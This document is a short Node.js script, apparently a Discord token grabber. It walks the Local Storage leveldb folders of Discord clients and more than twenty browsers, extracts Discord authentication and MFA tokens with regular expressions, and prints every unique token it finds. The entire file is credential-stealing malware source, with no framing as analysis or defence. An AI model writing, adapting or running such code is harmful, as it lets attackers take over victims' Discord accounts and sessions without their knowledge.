async function EL1T3() {
    const { readdir, readFile } = require('fs');

    async function GR4B() {
        const discord_path = [
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Discord/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Lightcord/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordptb/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,

            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Torch/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
            `${__dirname.split(`:`)[0]}:/Users/${__dirname.split(`\\`)[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
        ];

        const token_regex = [
            /[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}/,
            /[\w-]{24}.[\w-]{6}.[\w-]{27}/,
            /`mfa\.[\d\w_-]{84}`/,
            /mfa\.[\w-]{84}/
        ];
        
        let token_cache = [];
        await discord_path.forEach(async path => {
            await readdir(path, (err, files) => {
                if (files === undefined) return;

                files.filter(f => f.split('.').pop() === 'log' || 'lbd').forEach(filter => {
                    readFile(`${path}/${filter}`, 'utf-8', async function(err, data) {
                        await token_regex.forEach(async regex => {
                            let [match] = await regex.exec(data) || [null];

                            if (match != null && !token_cache.includes(match)) {
                                const token = match.replace(/`/g, '');
                                token_cache.push(token)
                                console.log(token);
                            };
                        });
                    });
                });
            });
        });
    };

    await GR4B();
};

EL1T3();
